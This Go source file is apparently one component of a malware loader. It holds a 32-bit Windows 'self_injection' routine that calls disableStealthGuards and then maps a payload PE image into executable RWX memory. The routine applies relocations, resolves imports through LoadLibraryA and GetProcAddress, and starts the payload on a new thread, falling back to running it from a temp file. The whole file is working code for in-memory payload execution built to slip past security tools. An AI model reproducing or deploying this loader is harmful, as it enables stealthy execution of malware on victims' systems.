//go:build ignore

package main

import (
	"encoding/binary"
	"syscall"
	"unsafe"
)

const (
	selfImageMachineI386 = 0x014C
	selfPE32Magic        = 0x10b
)

type selfImage32 struct {
	Base  uintptr
	Entry uintptr
	Size  uint32
}

// executeStrategy is the 32-bit self_injection entry point.
// x86 in-memory loading is limited; falls back to executeFromTemp on any failure.
func executeStrategy(payload []byte) {
	disableStealthGuards()

	pinned := append([]byte(nil), payload...)
	img, ok := selfMapImage32(pinned)
	if !ok {
		executeFromTemp(payload)
		return
	}
	selfRunImage32(img)
}

func selfMapImage32(payload []byte) (*selfImage32, bool) {
	if len(payload) < 0x1000 || payload[0] != 'M' || payload[1] != 'Z' {
		return nil, false
	}
	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if int(peOffset)+4 > len(payload) {
		return nil, false
	}
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		return nil, false
	}
	machine := binary.LittleEndian.Uint16(payload[peOffset+4:])
	if machine != selfImageMachineI386 {
		return nil, false
	}
	optOffset := peOffset + 24
	if int(optOffset+2) > len(payload) {
		return nil, false
	}
	magic := binary.LittleEndian.Uint16(payload[optOffset:])
	if magic != selfPE32Magic {
		return nil, false
	}
	sizeOfImage := binary.LittleEndian.Uint32(payload[optOffset+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optOffset+60:])
	entryRVA := binary.LittleEndian.Uint32(payload[optOffset+16:])
	imageBase := binary.LittleEndian.Uint32(payload[optOffset+28:])

	mem, _, _ := procVirtualAlloc.Call(uintptr(imageBase), uintptr(sizeOfImage), 0x3000, 0x40)
	if mem == 0 {
		mem, _, _ = procVirtualAlloc.Call(0, uintptr(sizeOfImage), 0x3000, 0x40)
		if mem == 0 {
			return nil, false
		}
	}
	base := mem

	image := unsafe.Slice((*byte)(unsafe.Pointer(base)), sizeOfImage)
	copy(image[:sizeOfHeaders], payload[:sizeOfHeaders])
	for i := sizeOfHeaders; i < sizeOfImage; i++ {
		image[i] = 0
	}

	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
	optionalSize := binary.LittleEndian.Uint16(payload[peOffset+20:])
	sectionOffset := optOffset + uint32(optionalSize)
	for i := uint16(0); i < numberOfSections; i++ {
		hdr := sectionOffset + uint32(i)*40
		if int(hdr+40) > len(payload) {
			break
		}
		virtualAddress := binary.LittleEndian.Uint32(payload[hdr+12:])
		virtualSize := binary.LittleEndian.Uint32(payload[hdr+8:])
		rawSize := binary.LittleEndian.Uint32(payload[hdr+16:])
		rawPtr := binary.LittleEndian.Uint32(payload[hdr+20:])
		size := virtualSize
		if size < rawSize {
			size = rawSize
		}
		if size == 0 {
			continue
		}
		dst := unsafe.Slice((*byte)(unsafe.Pointer(base+uintptr(virtualAddress))), size)
		for j := uint32(0); j < size; j++ {
			dst[j] = 0
		}
		if rawSize > 0 && int(rawPtr+rawSize) <= len(payload) {
			copy(dst[:rawSize], payload[rawPtr:rawPtr+rawSize])
		}
	}

	delta := int64(base) - int64(imageBase)
	if delta != 0 {
		if !selfApplyRelocations32(base, payload, optOffset, int32(delta)) {
			return nil, false
		}
	}

	if !selfResolveImports32(base, payload, optOffset) {
		return nil, false
	}

	return &selfImage32{
		Base:  base,
		Entry: base + uintptr(entryRVA),
		Size:  sizeOfImage,
	}, true
}

func selfRunImage32(img *selfImage32) {
	thread, _, _ := procCreateThread.Call(0, 0, img.Entry, img.Base, 0, 0)
	if thread != 0 {
		const infiniteWait = 0xFFFFFFFF
		procWaitForSingleObject.Call(thread, infiniteWait)
		procCloseHandle.Call(thread)
	} else {
		syscall.Syscall(img.Entry, 0, 0, 0, 0)
	}
}

func selfApplyRelocations32(base uintptr, payload []byte, optOffset uint32, delta int32) bool {
	// PE32 data directory entry 5 = Base Relocation (at optOffset + 96 + 40).
	relocBase := optOffset + 96 + 40
	if int(relocBase+8) > len(payload) {
		return true
	}
	relocRVA := binary.LittleEndian.Uint32(payload[relocBase:])
	relocSize := binary.LittleEndian.Uint32(payload[relocBase+4:])
	if relocRVA == 0 || relocSize == 0 {
		return true
	}
	table := unsafe.Slice((*byte)(unsafe.Pointer(base+uintptr(relocRVA))), relocSize)
	if len(table) == 0 {
		return false
	}
	offset := uint32(0)
	for offset < relocSize {
		if offset+8 > relocSize {
			break
		}
		pageRVA := binary.LittleEndian.Uint32(table[offset:])
		blockSize := binary.LittleEndian.Uint32(table[offset+4:])
		if blockSize == 0 {
			break
		}
		offset += 8
		entries := (blockSize - 8) / 2
		for i := uint32(0); i < entries; i++ {
			if offset+2 > relocSize {
				return false
			}
			entry := binary.LittleEndian.Uint16(table[offset:])
			offset += 2
			typeID := entry >> 12
			rel := pageRVA + uint32(entry&0x0FFF)
			target := base + uintptr(rel)
			switch typeID {
			case 0:
				continue
			case 0x3:
				val := *(*uint32)(unsafe.Pointer(target))
				*(*uint32)(unsafe.Pointer(target)) = uint32(int32(val) + delta)
			}
		}
	}
	return true
}

func selfResolveImports32(base uintptr, payload []byte, optOffset uint32) bool {
	importBase := optOffset + 104
	if int(importBase+8) > len(payload) {
		return true
	}
	importRVA := binary.LittleEndian.Uint32(payload[importBase:])
	importSize := binary.LittleEndian.Uint32(payload[importBase+4:])
	if importRVA == 0 || importSize == 0 {
		return true
	}
	descriptors := unsafe.Slice((*byte)(unsafe.Pointer(base+uintptr(importRVA))), importSize)
	if len(descriptors) == 0 {
		return false
	}
	offset := uint32(0)
	for {
		if offset+20 > importSize {
			break
		}
		origThunk := binary.LittleEndian.Uint32(descriptors[offset:])
		nameRVA := binary.LittleEndian.Uint32(descriptors[offset+12:])
		firstThunk := binary.LittleEndian.Uint32(descriptors[offset+16:])
		if origThunk == 0 && nameRVA == 0 && firstThunk == 0 {
			break
		}
		dllName := selfReadCString32(base, nameRVA)
		hModule := selfLoadLibrary32(dllName)
		if hModule == 0 {
			return false
		}
		lookup := origThunk
		if lookup == 0 {
			lookup = firstThunk
		}
		thunkPtr := base + uintptr(firstThunk)
		lookupPtr := base + uintptr(lookup)
		for {
			val := *(*uint32)(unsafe.Pointer(lookupPtr))
			if val == 0 {
				break
			}
			var procAddr uintptr
			if val&0x80000000 != 0 {
				ordinal := uintptr(val & 0xFFFF)
				addr, _, _ := procGetProcAddress.Call(hModule, ordinal)
				procAddr = addr
			} else {
				funcName := selfReadCString32(base, val+2)
				ptr, err := syscall.BytePtrFromString(funcName)
				if err != nil {
					return false
				}
				addr, _, _ := procGetProcAddress.Call(hModule, uintptr(unsafe.Pointer(ptr)))
				procAddr = addr
			}
			if procAddr == 0 {
				return false
			}
			*(*uintptr)(unsafe.Pointer(thunkPtr)) = procAddr
			lookupPtr += 4
			thunkPtr += 4
		}
		offset += 20
	}
	return true
}

func selfReadCString32(base uintptr, rva uint32) string {
	if rva == 0 {
		return ""
	}
	var buf []byte
	for i := 0; i < 1024; i++ {
		b := *(*byte)(unsafe.Pointer(base + uintptr(rva) + uintptr(i)))
		if b == 0 {
			break
		}
		buf = append(buf, b)
	}
	return string(buf)
}

func selfLoadLibrary32(name string) uintptr {
	if name == "" {
		return 0
	}
	ptr, err := syscall.BytePtrFromString(name)
	if err != nil {
		return 0
	}
	h, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(ptr)))
	return h
}
